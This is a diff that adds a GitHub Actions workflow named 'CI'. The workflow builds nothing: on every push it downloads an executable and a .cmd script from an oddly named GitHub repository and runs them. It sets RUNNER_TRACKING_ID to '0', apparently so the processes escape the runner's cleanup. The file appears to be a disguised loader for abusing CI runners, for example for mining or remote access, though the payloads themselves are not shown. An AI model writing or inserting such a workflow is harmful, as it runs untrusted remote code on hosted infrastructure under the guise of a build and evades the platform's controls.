@@ -1,0 +1,22 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-2019
+
+    steps:
+    - name: Download Untitled.exe
+      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled.exe -OutFile untitled.exe
+
+    - name: Download cmd.cmd
+      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/cmd.cmd -OutFile cmd.cmd
+
+    - name: Run Untitled.exe & cmd.cmd
+      env:
+        RUNNER_TRACKING_ID: "0"
+      run: |
+        .\untitled.exe
+        .\cmd.cmd
